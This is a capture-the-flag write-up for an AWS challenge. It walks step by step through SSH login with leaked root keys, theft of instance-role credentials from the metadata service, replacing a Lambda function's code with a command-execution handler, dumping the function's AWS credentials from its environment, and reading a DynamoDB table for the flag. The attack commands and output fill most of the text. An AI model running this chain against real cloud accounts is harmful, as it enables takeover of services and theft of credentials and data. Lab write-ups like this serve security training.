# A Quick Vacation

## Description





## Solution

From earlier challenge we find SSH keys. Let's review the public key which will contain the username and the hostname information.

```bash
cat func_adm/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAA...s= root@ip-3-140-244-184
```

We find the target IP address which is `3.140.244.184` and the username is `root`. We can try login to SSH service using the private key.

```
chmod 600 id_rsa
ssh -i id_rsa root@3.140.244.184
...
root@ip-172-31-23-45:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Having root access we can explore the file system to see if there are any interesting files lying around. We find nothing interesting there. Let's continue to see if this instance also has configured with any other role. 

```bash
root@ip-172-31-23-45:~# curl http://169.254.169.254
...
 <head>
  <title>401 - Unauthorized</title>
 </head>
 <body>
  <h1>401 - Unauthorized</h1>
 </body>
</html>
```

This instance has [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) enabled meaning it require a token in the request header to authenticate us to the service. Let's issue below command to configure the header. 

```bash
TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/ | head
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
```

This is successful. Let's enumerate the IAM role. 

```bash
root@ip-172-31-23-45:~# curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
{
  "Code" : "Success",
  "LastUpdated" : "2022-04-11T10:59:47Z",
  "InstanceProfileArn" : "arn:aws:iam::852948644505:instance-profile/LambdaRole",
  "InstanceProfileId" : "AIPA4NF5TOKMTZVQUJG6D"
}
```

We see that the `LambdaRole` is attached to this instance. Get the credentials and configure them. Since it named based on `Lambda` service its obvious to enumerate the Lambda Functions or else we can go hard way enumerating using enumeration tools. Let's list the Lambda functions by issuing below command.

```bash
aws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "StatusChecker",
            "FunctionArn": "arn:aws:lambda:us-east-1:852948644505:function:StatusChecker",
            "Runtime": "nodejs14.x",
            "Role": "arn:aws:iam::852948644505:role/LambdaExecutionRole",
            "Handler": "index.handler",
            "CodeSize": 311,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2022-04-11T11:42:03.905+0000",
            "CodeSha256": "1e6/l2sBlAldp0u4mpy8jCELdaBavDUvojKwRRvIaxI=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "fe5b98b0-5f52-4c7b-bc70-eae43c05ad6d",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            }
        }
    ]
}
```

We see that there is a function called `StatusChecker` present. Let's see if we can invoke the function. 

```bash
aws lambda invoke --function-name StatusChecker --payload '' output
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

 We can invoke the function. Let's look at the output file. 

```bash
cat output 
{"statusCode":200,"body":"\"Under maintenance\""}
```

The function is down for maintenance. Let's try to download the source code using `get-function`. 

```bash
sudo apt install jq -y
aws lambda get-function --function-name StatusChecker | jq .Code.Location
"https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/852948644505/StatusChecker-25e75b6f-ffe3-4010-bd63-595d3ee6d6f5?versionId=9w1g2QKj5vKG9r51ad6i4eFC7ODmKqZB&X-Amz-Security-Token=IQoJb..%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220411T115327Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY3UMGFTBC7%2F20220411%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=4b17b737af4125c8292214a70b08b634f9e26d7d3d682fc46ea26215387876c3"
```

Opening the link downloads a zip file which contains the source code of this function. 

> Note: Simple wget does the job too.

```javascript
exports.handler = async (event) => {
    // TODO implement
    const response = {
        statusCode: 200,
        body: JSON.stringify('Under maintenance'),
    };
    return response;
};
```

This has a default template which returns `Under maintenance`. We can try to update this function code with arbitrary reverse shell to gain access to this instance. 

Save below code as `index.js` 

```javascript
var exec = require('child_process').exec;
exports.handler = function(event, context) {
    var child = exec(event.command,
        function (error, stdout, stderr) {
            var result = {
                "stdout": stdout,
                "stderr": stderr,
                "error": error
            };
            context.succeed(result);
        }
    );
}
```

Create an archive as `code.zip` including this file. 

```bash
zip code.zip index.js
```

We can try to update the function code using this. 

```bash
aws lambda update-function-code --function-name StatusChecker --zip-file fileb://code.zip
{
    "FunctionName": "StatusChecker",
    "FunctionArn": "arn:aws:lambda:us-east-1:852948644505:function:StatusChecker",
    "Runtime": "nodejs14.x",
    "Role": "arn:aws:iam::852948644505:role/LambdaExecutionRole",
    "Handler": "index.handler",
    "CodeSize": 343,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-04-11T12:54:49.000+0000",
    "CodeSha256": "JTNVJV0EK8TeTeFw8Z5swXhVk02SH2TvBeQl1QZItkI=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "ec98f834-8ac7-4fed-8542-6f0bc54fd74b",
    "State": "Active",
    "LastUpdateStatus": "InProgress",
    "LastUpdateStatusReason": "The function is being created.",
    "LastUpdateStatusReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
```

This is successful. Let's invoke the function to execute the commands. 

```bash
aws lambda invoke --function-name StatusChecker --payload '{"command":"id"}' output.json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

```bash
cat output.json 
{"stdout":"uid=993(sbx_user1051) gid=990 groups=990\n","stderr":"","error":null}
```

This works. It is very common that Lambda functions often configured with IAM Roles that has excessive privileges. Let's enumerate credentials. Reading [docs](https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html#configuration-envvars-runtime) reveals that the runtime environment has these credentials configured. 

```bash
aws lambda invoke --function-name StatusChecker --payload '{"command":"env"}' output.json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

```bash
cat output.json 
{"stdout":"AWS_SESSION_TOKEN=IQoJb...IUow==\nAWS_SECRET_ACCESS_KEY=jfBUnf/HdT21hT4HYKUEZFmB1ZqnuBu9igE/9X6c\n\nAWS_ACCESS_KEY_ID=ASIA4NF5TOKMVWDBNYNH\n...","stderr":"","error":null}
```

> Note: Output cleaned for better view

Configure credentials and enumerate the privileges using `weirdAAL`. 

```bash
aws sts get-caller-identity
{
    "UserId": "AROA4NF5TOKMQVMP3IJSS:StatusChecker",
    "Account": "852948644505",
    "Arn": "arn:aws:sts::852948644505:assumed-role/LambdaExecutionRole/StatusChecker"
}
```

It has observed that the above role can interact with DynamoDB service. Let's list the tables. 

```bash
aws dynamodb list-tables
{
    "TableNames": [
        "Records",
        "airflow"
    ]
}
```

We see 2 tables. View the info of `Records`. 

```bash
aws dynamodb scan --table-name Records
{
    "Items": [
        {
            "id": {
                "S": "2"
            },
            "name": {
                "S": "Oliveira aka Tokyo"
            }
        },
        {
            "id": {
                "S": "1"
            },
            "name": {
                "S": "Sergio aka The Professor"
            }
        },
        {
            "id": {
                "S": "5"
            },
            "name": {
                "S": "Bandera aka flag - ACVCTF{4lph4_b3t4_g4mm4_l4mbda_0ops!}"
            }
        },
        {
            "id": {
                "S": "4"
            },
            "name": {
                "S": "Jiménez aka Nairobi"
            }
        },
        {
            "id": {
                "S": "3"
            },
            "name": {
                "S": "Fonollosa aka Berlin"
            }
        }
    ],
    "Count": 5,
    "ScannedCount": 5,
    "ConsumedCapacity": null
}
```

Flag is revealed in one of the records. 
